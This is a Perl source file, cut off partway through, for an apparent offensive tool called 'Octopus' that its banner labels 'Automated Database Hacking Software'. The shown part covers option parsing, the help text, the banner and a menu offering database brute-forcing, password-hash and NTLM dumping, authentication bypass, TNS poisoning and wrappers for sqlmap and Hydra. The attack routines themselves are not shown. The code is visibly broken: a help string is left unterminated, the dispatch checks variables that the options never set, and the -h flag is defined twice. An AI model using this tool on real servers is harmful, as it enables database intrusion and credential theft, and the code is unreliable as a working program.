# *************************************************************************************** #
# ---------------------------------- EULA NOTICE ---------------------------------------- #
#                     Agreement between "Haroon Awan" and "You"(user).                    #
# ---------------------------------- EULA NOTICE ---------------------------------------- #
#  1. By using this piece of software your bound to these point.                          #
#  2. This an End User License Agreement (EULA) is a legal between a software application #
#     author "Haroon Awan" and (YOU) user of this software.                               #
#  3. This software application grants users rights to use for any purpose or modify and  #
#     redistribute creative works.                                                        #
#  4. This software comes in "is-as" warranty, author "Haroon Awan" take no responsbility #
#     what you do with by/this software as your free to use this software.                #
#  5. Any other purpose(s) that it suites as long as it is not related to any kind of     #
#     crime or using it in un-authorized environment.                                     #
#  6. You can use this software to protect and secure your data information in any        #
#     environment.                                                                        #
#  7. It can also be used in state of being protection against the unauthorized use of    #
#     information.                                                                        #
#  8. It can be used to take measures achieve protection.                                 #
# *************************************************************************************** #


#!/usr/bin/perl

use if $^O eq "MSWin32", Win32::Console::ANSI;
use Getopt::Long;
use HTTP::Request;
use utf8;
use open qw(:std :utf8);
use HTML::TokeParser;
use WWW::Mechanize;
use Data::Dumper;
use HTTP::Response;
use HTTP::Headers;
use HTTP::Request::Common qw(POST);
use HTTP::Request::Common qw(GET);
use feature 'say';
use IO::Select;
use HTML::TableExtract;
use IO::Socket::INET;
use Term::ANSIColor;
use URI::URL;
use Mojo::DOM;
use Mojo::UserAgent;
use Data::Dumper;
use LWP::UserAgent;
use LWP::Simple;
use JSON qw( decode_json encode_json );

my $ua = LWP::UserAgent->new;
$ua = LWP::UserAgent->new(keep_alive => 1);
$ua->agent("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31");

GetOptions(
    "h|help" => \$help,
    "a|mssqlinfo=s" => \$mssqlinfov,
    "b|mysqlinfo=s" => \$mysqlinfov,
    "c|mangodbinfo=s" => \$mangodbinfov,
    "d|oracleinfo=s" => \$oracleinfov,
    "e|influxdbinfo=s" => \$influxdbinfov,
    "f|mssqlconfig=s" => \$mssqlconfigv,
    "g|mssqldumphahses=s" => \$mssqldumphahsesv,
    "h|mssqldumpntml=s" => \$mssqldumpntmlv,
    "i|mssqlbruteforce=s" => \$mssqlbruteforcev,
    "j|mssqldac=s" => \$mssqldacv,
    "k|mssqlemptypassword" => \$mssqlemptypasswordv,
    "l|mssqlquery=s" => \$mssqlqueryv,
    "m|mssqlxpshell=s" => \$mssqlxpshellv,
    "n|msqlbrodcast=s" => \$msqlbrodcastv,
    "o|mysqlvaliduser=s" => \$mysqlvaliduserv,
    "p|mysqlpassdguess=s" => \$mysqlpassdguessv,
    "q|mysqlemptypasswd=s" => \$mysqlemptypasswdv,
    "r|mysqlalldatabase=s" => \$mysqlalldatabasev,
    "s|mysqlallusers=s" => \$mysqlallusersv,
    "t|mysqlauditdatabases" => \$mysqlauditdatabasesv,
    "u|mysqlpasswdhashes=s" => \$mysqlpasswdhashesv,
    "v|mysqlauthnbypass=s" => \$mysqlauthnbypassv,
    "w|mariaauthnbypass=s" => \$mariaauthnbypassv,
    "x|oraclebruteforce=s" => \$oraclebruteforcev,
    "y|oracletnsversion=s" => \$oracletnsversionv,
    "z|oraclepasswordhash=s" => \$oraclepasswordhashv,
    "aa|oracleenumerateusernames=s" => \$oracleenumerateusernamesv,
    "ab|oracletnshack=s" => \$oracletnshackv,
    "ac|oraclesid=s" => \$oraclesidv,
    "ad|mangodbdatabases" => \$mangodbdatabasesv,    
    "ae|mangodBinfo=s" => \$mangodBinfov,
    "af|couchdBinfo=s" => \$couchdBinfov,
    "ag|mysqlvcombo=s" => \$mysqlvcombov,
    "ah|couchdbvcombo=s" => \$couchdbvcombov,
    "ai|mssqlvcombo=s" => \$mssqlvcombov,
    "aj|oraclevcombo=s" => \$oraclevcombov,    
    "ak|influxdbvcombo=s" => \$influxdbvcombov,
    "al|mariadbvcombo=s" => \$mariadbvcombov,
    "am|hydraoracle=s" => \$hydraoraclev,
    "an|oscanner=s" => \$oscannerv,
    "ao|odatscanner=s" => \$odatscannerv,
    "ap|odatscannertnscmd=s" => \$odatscannertnscmdv,
    "aq|nmapchecks=s" => \$nmapchecksv,    
    "ar|findiis=s" => \$findiisv,
    "as|nikto=s" => \$niktov,    
    "at|sqlmap=s" => \$sqlmapv,    
    "au|sqliv=s" => \$sqlivv,
    "av|cewl=s" => \$cewlv,    
    "aw|uri=s" => \$uriv,
    "ax|crawler" => \$crawlerv,    
    "ay|databasedorks=s" => \$databasedorksv,
    
);

if ($help) { banner();help(); }
if ($mssqlinfo) { banner();mssqlinfo(); }
if ($mysqlinfo) { banner();mysqlinfo(); }
if ($mangodbinfo) { banner();mangodbinfo(); }
if ($oracleinfo) { banner();oracleinfo(); }
if ($influxdbinfo) { banner();influxdBinfo(); }
if ($mssqlconfig) { banner();mssqlconfig();}
if ($mssqldumphahses) { banner();mssqldumphahses();}
if ($mssqldumpntml) { banner();mssqldumpntml(); }
if ($mssqlbruteforce) { banner();mssqlbruteforce(); }
if ($mssqldac) { banner();mssqldac(); }
if ($mssqlemptypassword) { banner();mssqlemptypassword(); }
if ($mssqlquery) { banner();mssqlquery(); }
if ($mssqlxpshell) { banner();mssqlxpshell(); }
if ($msqlbrodcast) { banner();msqlbrodcast(); }
if ($mysqlvaliduser) { banner();mysqlvaliduser(); }
if ($mysqlpassdguess) { banner();mysqlpassdguess(); }
if ($mysqlemptypasswd) { banner();mysqlemptypasswd(); }
if ($mysqlalldatabase) { banner();mysqlalldatabase();}
if ($mysqlallusers) { banner();mysqlallusers();}
if ($mysqlquery) { banner();mysqlquery(); }
if ($mysqlauditdatabases) { banner();mysqlauditdatabases(); }
if ($mysqlpasswdhashes) { banner();mysqlpasswdhashes(); }
if ($mysqlauthnbypass) { banner();mysqlauthnbypass(); }
if ($mariaauthnbypass) { banner();mariaauthnbypass(); }
if ($oraclebruteforce) { banner();oraclebruteforce(); }
if ($oracletnsversion) { banner();oracletnsversion(); }
if ($oraclepasswordhash) { banner();oraclepasswordhash(); }
if ($oracleenumerateusernames) { banner();oracleenumerateusernames();}
if ($oracletnshack) { banner();oracletnshack();}
if ($oraclesid) { banner();oraclesid(); }
if ($mangodbdatabases) { banner();mangodbdatabases(); }
if ($mangodBinfo) { banner();mangodBinfo(); }
if ($couchdBinfo) { banner();couchdBinfo(); }
if ($mysqlvcombo) { banner();mysqlvcombo(); }
if ($couchdbvcombo) { banner();couchdbvcombo(); }
if ($mssqlvcombo) { banner();mssqlvcombo();}
if ($oraclevcombo) { banner();oraclevcombo();}
if ($influxdbvcombo) { banner();influxdbvcombo(); }
if ($mariadbvcombo) { banner();mariadbvcombo(); }
if ($hydraoracle) { banner();hydraoracle(); }
if ($oscanner) { banner();oscanner(); }
if ($odatscanner) { banner();odatscanner(); }
if ($odatscannertnscmd) { banner();odatscannertnscmd(); }
if ($nmapchecks) { banner();nmapchecks(); }
if ($findiis) { banner();findiis(); }
if ($nikto) { banner();nikto();}
if ($sqlmap) { banner();sqlmap();}
if ($sqliv) { banner();sqliv(); }
if ($cewl) { banner();cewl(); }
if ($uri) { banner();uri(); }
if ($crawler) { banner();crawler(); }
if ($databasedorks) { banner();databasedorks(); }

unless (@ARGV > 1) { banner();menu(); }


#--------------------------------------------------------------#
#                            Help                              #
#--------------------------------------------------------------#
sub help {
    print line_u(),color('bold cyan'),"#                   ";
    print item('1'),"MS-SQL  - Extract Information ";
    print color('bold red'),"=> ";
    print color("bold white"),"octopus -a site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('2'),"My-SQL - Extract Information ";
    print color('bold red'),"=> ";
    print color("bold white"),"octopus -b site.com;
    print color('bold cyan'),"                   #   \n";
;
    print color('bold cyan'),"#                   ";
    print item('3'),"Mangodb - Extract Information ";
    print color('bold red'),"=> ";
    print color("bold white"),"octopus -c site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('4'),"ORACLE - Extract Information ";
    print color('bold red'),"=> ";
    print color("bold white"),"octopus -d site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('5'),"InFluxdB - Extract Information ";
    print color('bold red'),"   => ";
    print color("bold white"),"octopus -e site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('6'),"MS-SQL - Extract Configuration ";
    print color('bold red')," => ";
    print color("bold white"),"octopus -f site.com";
    print color('bold cyan'),"         #   \n";

    print color('bold cyan'),"#                   ";
    print item('7'),"MS-SQL - Dump Hashes ";
    print color('bold red'),"  => ";
    print color("bold white"),"octopus -g site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('8'),"MS-SQL - DUMP NTLM  ";
    print color('bold red'),"  => ";
    print color("bold white"),"octopus -h site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('9'),"MS-SQL - Brute Force  ";
    print color('bold red'),"  => ";
    print color("bold white"),"octopus -i site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('10'),"MS-SQL check Backup Dedicated Admin Connection ";
    print color('bold red'),"  => ";
    print color("bold white"),"octopus -j site.com";
    print color('bold cyan'),"                   #   \n";

    print color('bold cyan'),"#                   ";
    print item('11'),"MS-SQL Empty Password ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -k site.com";
    print color('bold cyan'),"                 #   \n",line_d();


    print color('bold cyan'),"#                   ";
    print item('12'),"MS-SQL Query using default username and password ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -l site.com";
    print color('bold cyan'),"                 #   \n",line_d();


    print color('bold cyan'),"#                   ";
    print item('13'),"MS-SQL Check XP CMD Shell ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -l site.com";
    print color('bold cyan'),"                 #   \n",line_d();

    print color('bold cyan'),"#                   ";
    print item('14'),"MS-SQL Discover Servers in Same Domain ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -m site.com";
    print color('bold cyan'),"                 #   \n",line_d();

    print color('bold cyan'),"#                   ";
    print item('15'),"My-SQL Perform Valid User Enumeration ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -n site.com";
    print color('bold cyan'),"                 #   \n",line_d();

    print color('bold cyan'),"#                   ";
    print item('16'),"My-SQL Perform Password Guess ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -o site.com";
    print color('bold cyan'),"                 #   \n",line_d();

    print color('bold cyan'),"#                   ";
    print item('17'),"My-SQL Check Empty Passwd ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -p site.com";
    print color('bold cyan'),"                 #   \n",line_d();

    print color('bold cyan'),"#                   ";
    print item('18'),"My-SQL List All Database ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -q site.com";
    print color('bold cyan'),"                 #   \n",line_d();

    print color('bold cyan'),"#                   ";
    print item('19'),"My-SQL List All Users ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -r site.com";
    print color('bold cyan'),"                 #   \n",line_d();

    print color('bold cyan'),"#                   ";
    print item('20'),"My-SQL Run Query Aginst Server ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -s site.com";
    print color('bold cyan'),"                 #   \n",line_d();
        
    print color('bold cyan'),"#                   ";
    print item('21'),"My-SQL Dumps Password Hashes ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -t site.com";
    print color('bold cyan'),"                 #   \n",line_d();
    
    print color('bold cyan'),"#                   ";
    print item('22'),"My-SQL Audit Local or Compromised Server ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -u site.com";
    print color('bold cyan'),"                 #   \n",line_d();
    
    print color('bold cyan'),"#                   ";
    print item('23'),"My-SQL Bypass Server Authenication ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -v site.com";
    print color('bold cyan'),"                 #   \n",line_d();

    print color('bold cyan'),"#                   ";
    print item('24'),"My-SQL Audit Local or Compromised Server ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -w site.com";
    print color('bold cyan'),"                 #   \n",line_d();
    
    print color('bold cyan'),"#                   ";
    print item('25'),"My-SQL Server Authenication Bypass ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -x site.com";
    print color('bold cyan'),"                 #   \n",line_d(); 

    print color('bold cyan'),"#                   ";
    print item('26'),"MariaDB Server Authenication Bypass ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -y site.com";
    print color('bold cyan'),"                 #   \n",line_d();
    
    print color('bold cyan'),"#                   ";
    print item('27'),"My-SQL Bypass Server Authenication ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -z site.com";
    print color('bold cyan'),"                 #   \n",line_d();

    print color('bold cyan'),"#                   ";
    print item('28'),"ORACLE - Perform Brute Force ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -aa site.com";
    print color('bold cyan'),"                 #   \n",line_d();
    
    print color('bold cyan'),"#                   ";
    print item('29'),"ORACLE - Decodes the VSNNUM ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -ab site.com";
    print color('bold cyan'),"                 #   \n",line_d();

    print color('bold cyan'),"#                   ";
    print item('30'),"ORACLE - Perform Session key for Password Hash ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -ac site.com";
    print color('bold cyan'),"                 #   \n",line_d();
    
    print color('bold cyan'),"#                   ";
    print item('31'),"ORACLE - Enumerate valid Oracle user names ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -ad site.com";
    print color('bold cyan'),"                 #   \n",line_d(); 

    print color('bold cyan'),"#                   ";
    print item('32'),"ORACLE - Check TNS poison Vulnerability ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -ae site.com";
    print color('bold cyan'),"                 #   \n",line_d();
        
    print color('bold cyan'),"#                   ";
    print item('33'),"MANGODB - List MandodB Database ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -af site.com";
    print color('bold cyan'),"                 #   \n",line_d();
        
    print color('bold cyan'),"#                   ";
    print item('34'),"MANGODB - Extract MandodB Info ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -ag site.com";
    print color('bold cyan'),"                 #   \n",line_d();
        
    print color('bold cyan'),"#                   ";
    print item('35'),"COUCHDB - Extract Database Info ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -ah site.com";
    print color('bold cyan'),"                 #   \n",line_d();
        
    print color('bold cyan'),"#                   ";
    print item('36'),"MYSQL - COMBO Vulernabilities Scan ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -ai site.com";
    print color('bold cyan'),"                 #   \n",line_d();
     
    print color('bold cyan'),"#                   ";
    print item('37'),"ORACLE - COMBO Vulernabilities Scan ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -aj site.com";
    print color('bold cyan'),"                 #   \n",line_d();
     
    print color('bold cyan'),"#                   ";
    print item('38'),"ORACLE - COMBO Vulernabilities Scan ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -ak site.com";
    print color('bold cyan'),"                 #   \n",line_d();
     
     print color('bold cyan'),"#                   ";
    print item('39'),"InfluxdB - COMBO Vulernabilities Scan ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -al site.com";
    print color('bold cyan'),"                 #   \n",line_d();
     
    print color('bold cyan'),"#                   ";
    print item('40'),"Hyra - Oracle ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -am site.com";
    print color('bold cyan'),"                 #   \n",line_d();
     
     print color('bold cyan'),"#                   ";
    print item('41'),"Oscanner ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -an site.com";
    print color('bold cyan'),"                 #   \n",line_d();
     
     print color('bold cyan'),"#                   ";
    print item('42'),"Odat Scanner ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -ao site.com";
    print color('bold cyan'),"                 #   \n",line_d();
     
    print color('bold cyan'),"#                   ";
    print item('43'),"Odat Scaner CMD ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -ap site.com";
    print color('bold cyan'),"                 #   \n",line_d();
     
    print color('bold cyan'),"#                   ";
    print item('44'),"Nmap Checks ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -aq site.com";
    print color('bold cyan'),"                 #   \n",line_d();
     
    print color('bold cyan'),"#                   ";
    print item('45'),"Find IIS Directories ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -ar site.com";
    print color('bold cyan'),"                 #   \n",line_d();
     
    print color('bold cyan'),"#                   ";
    print item('46'),"Nikto ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -as site.com";
    print color('bold cyan'),"                 #   \n",line_d();     
      
    print color('bold cyan'),"#                   ";
    print item('47'),"SQLMAP ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -at site.com";
    print color('bold cyan'),"                 #   \n",line_d();
      
    print color('bold cyan'),"#                   ";
    print item('48'),"SQLiV ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -au site.com";
    print color('bold cyan'),"                 #   \n",line_d();
    
    print color('bold cyan'),"#                   ";
    print item('49'),"CEWL ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -av site.com";
    print color('bold cyan'),"                 #   \n",line_d();
      
    print color('bold cyan'),"#                   ";
    print item('50'),"URI ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -aw site.com";
    print color('bold cyan'),"                 #   \n",line_d();
              
    print color('bold cyan'),"#                   ";
    print item('51'),"Crawler ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -ax site.com";
    print color('bold cyan'),"                 #   \n",line_d();
          
     
    print color('bold cyan'),"#                   ";
    print item('52'),"Database Dorks ";
    print color('bold red'),"        => ";
    print color("bold white"),"octopus -ay site.com";
    print color('bold cyan'),"                 #   \n",line_d();
     
}

#--------------------------------------------------------------#
#                           Banner                             #
#--------------------------------------------------------------#
sub banner {
    if ($^O =~ /MSWin32/) {system("mode con: cols=130 lines=40");system("cls"); }else { system("resize -s 40 130");system("clear"); }

print color('bold green ');
print qq{
							  ___   ____ _____ ___  ____  _   _ ____ 
							 / _ \\ / ___|_   _/ _ \\|  _ \\| | | / ___|
							| | | | |     | || | | | |_) | | | \\___ \\
							| |_| | |___  | || |_| |  __/| |_| |___) |
							 \\___/ \\____| |_| \\___/|_|    \\___/|____/
							
};
print "\n";
print color('reset');
print color('bold red on_black'),"						Version       ";print color('reset'),"";print color('bold white'),"      version 1.9a\n";
print color('reset');

print color('reset');
print color('bold red on_black'),"						Coder         ";print color('reset'),"";print color('bold red'),"      Haroon Awan\n";
print color('reset');

print color('bold white on_bright_red'),"						Mail          ";print color('reset'),"";print color('bright_blue'),"      mrharoonawan\@gmail.com\n";
print color('reset');

print color('bold yellow on_red'),"						Web           ";print color('reset'),"";print color('bold yellow'),"      http://www.github.com/haroonawanofficial\n";
print color('reset');

print color('bold green on_black'),"						Facebook      ";print color('reset'),"";print color('bold green'),"      fb.com/officialharoonawan\n";
print color('reset');

print color('bold white on_blue'),"						Instagram     ";print color('reset'),"";print color('bold white'),"      http://www.instagram.com/\haroonawanofficial\n";
print color('reset');

                                                                     


print color('bold cyan'),"\n\n					    ";print color('bold white'),"   	             Automated Database Hacking Software  "; print color('bold cyan'),"      \n\n"; 
}
#--------------------------------------------------------------#
#                             Menu                             #
#--------------------------------------------------------------#
sub menu {
    print line_u(),color('bold cyan'),"					#          ";print color('reset'),item('1')," MS-SQL    - Extract Information";print color('bold cyan'),"                           #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('2')," My-SQL    - Extract Information";print color('bold cyan'),"                           #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('3')," Mangodb   - Extract Information";print color('bold cyan'),"                           #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('4')," ORACLE    - Extract Information";print color('bold cyan'),"                           #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('5')," InFluxdB  - Extract Information";print color('bold cyan'),"                           #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('6')," MS-SQL    - Extract Configuration";print color('bold cyan'),"                         #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('7')," MS-SQL    - DUMP Hashes";print color('bold cyan'),"                                   #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('8')," MS-SQL    - DUMP NTLM Info";print color('bold cyan'),"                                #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('9')," MS-SQL    - Brute force ";print color('bold cyan'),"                                  #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('10'),"MS-SQL    - Check Backup Dedicated Admin Connection";print color('bold cyan'),"       #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('11'),"MS-SQL    - Check Empty Password";print color('bold cyan'),"                          #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('12'),"MS-SQL    - Query using default user and password";print color('bold cyan'),"         #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('13'),"MS-SQL    - Check XP SHELL";print color('bold cyan'),"                                #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('14'),"MS-SQL    - Find Same Broadcast Domain.";print color('bold cyan'),"                   #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('15'),"My-SQL    - Perform valid-user Enumeration";print color('bold cyan'),"                #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('16'),"My-SQL    - Perform Password Guess";print color('bold cyan'),"                        #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('17'),"My-SQL    - Check Empty Password";print color('bold cyan'),"                          #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('18'),"My-SQL    - List all Databases";print color('bold cyan'),"                            #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('19'),"My-SQL    - List all Users ";print color('bold cyan'),"                               #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('20'),"My-SQL    - Query using default user and password";print color('bold cyan'),"         #   \n";                    
    print color('bold cyan'),"					#          ";print color('reset'),item('21'),"My-SQL    - Audits Database Server Security Configuration";print color('bold cyan')," #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('22'),"My-SQL    - Dumps Password Hash";print color('bold cyan'),"                           #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('23'),"My-SQL    - Check Bypass Authentication ";print color('bold cyan'),"                  #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('24'),"MariaDB   - Check Bypass Authentication ";print color('bold cyan'),"                  #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('25'),"Oracle    - Performe Brute Force against Server";print color('bold cyan'),"           #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('26'),"Oracle    - Decode VSNNUM version number";print color('bold cyan'),"                  #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('27'),"Oracle    - Perform Session key for Password Hash";print color('bold cyan'),"         #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('28'),"Oracle    - Enumerate Valid Usernames";print color('bold cyan'),"                     #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('29'),"Oracle    - TNS Poison Hack";print color('bold cyan'),"                               #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('30'),"Oracle    - Guess Oracle instance/SID";print color('bold cyan'),"                     #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('31'),"MangodB   - List MangodB Database";print color('bold cyan'),"                         #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('32'),"MangodB   - Perform Brute Force ";print color('bold cyan'),"                          #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('33'),"CouchdB   - List all Databases";print color('bold cyan'),"                            #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('34'),"My-SQL    - Combo - Peform All Test";print color('bold cyan'),"                       #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('35'),"CouchdB   - Combo - Peform All Test";print color('bold cyan'),"                       #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('36'),"Ms-SQL    - Combo - Peform All Test";print color('bold cyan'),"                       #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('37'),"ORACLE    - Combo - Peform All Test";print color('bold cyan'),"                       #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('38'),"InfluxDB  - Combo - Peform All Test";print color('bold cyan'),"                       #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('39'),"MariaDB   - Combo - Peform All Test";print color('bold cyan'),"                       #   \n";                            
    print color('bold cyan'),"					#          ";print color('reset'),item('40'),"ORACLE    - BruteForce -  Listener with Hydra";print color('bold cyan'),"             #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('41'),"ORACLE    - Enumerate SID Common Passwords with OScanner";print color('bold cyan'),"  #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('42'),"ORACLE    - BruteForce - SID with Hydra";print color('bold cyan'),"                   #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('43'),"ORACLE    - Load Odat Tool";print color('bold cyan'),"                                #   \n";                                
    print color('bold cyan'),"					#          ";print color('reset'),item('44'),"NMAP      - Check RDP, MS RPC and Netbios Ports";print color('bold cyan'),"           #   \n";    
    print color('bold cyan'),"					#          ";print color('reset'),item('45'),"DEADLOCKS - Find IIS Directories";print color('bold cyan'),"                          #   \n";    
    print color('bold cyan'),"					#          ";print color('reset'),item('46'),"DEADLOCKS - Perform Nikto Scan on Server";print color('bold cyan'),"                  #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('47'),"DEADLOCKS - Perform SQLMAP on Parameter";print color('bold cyan'),"                   #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('48'),"DEADLOCKS - Perform SQLiv on Parameter";print color('bold cyan'),"                    #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('49'),"DEADLOCKS - CHECK - words and write that into wordlist";print color('bold cyan'),"    #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('50'),"DEADLOCKS - SHOW - Web URI";print color('bold cyan'),"                                #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('51'),"DEADLOCKS - SHOW - Crawl for URI from Complete Website";print color('bold cyan'),"    #   \n";
    print color('bold cyan'),"					#          ";print color('reset'),item('52'),"Database  - Use Database Dorks";print color('bold cyan'),"                            #   \n";
    print line_d(),color('bold cyan'),"					   ";    
    print color('bold green'),"\nOctopus: _>  ";
    print color('reset');
    chomp($number=<STDIN>);

    if($number eq '1'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');        
        chomp($mssqlinfov=<STDIN>);
        print "\n";
        mssqlinfo();
        enter();
    }if($number eq '2'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mysqlinfov=<STDIN>);
        print "\n";
        mysqlinfo();
        enter();
    }if($number eq '3'){
        banner();
         print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mangodbinfov=<STDIN>);
        print "\n";
        mangodbinfo();
        enter();
    }if($number eq '4'){
        banner();
         print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($oracleinfov=<STDIN>);
        oracleinfo();
        enter();
    }if($number eq '5'){
        banner();
         print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($influxdbinfov=<STDIN>);
        print "\n";
        influxdbinfo();
        enter();
    }if($number eq '6'){
        banner();
         print line_u(),color('bold cyan'),"                                       #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mssqlconfigv=<STDIN>);
        print "\n";
        mssqlconfig();
        enter();
    }if($number eq '7'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mssqldumphahsesv=<STDIN>);
        print "\n";
        mssqldumphahses();
        enter();
    }if($number eq '8'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mssqldumpntmlv=<STDIN>);
        print "\n";
        mssqldumpntml();
        enter();
    }if($number eq '9'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mssqlbruteforcev=<STDIN>);
        print "\n";
        mssqlbruteforce();
        enter();
    }if($number eq '10'){
        banner();
        print line_u(),color('bold cyan'),"                                        #                        ";print color('reset'),item(),"Enter Target Website";print color('bold cyan'),"                         #   \n",line_d();
        print color('bold green'),"\n\n0ctopus _>  ";
        print color('bold white');
        chomp($mssqldacv=<STDIN>);
        print "\n";
        mssqldac();
        enter();
    }if($number eq '11'){
        banner();
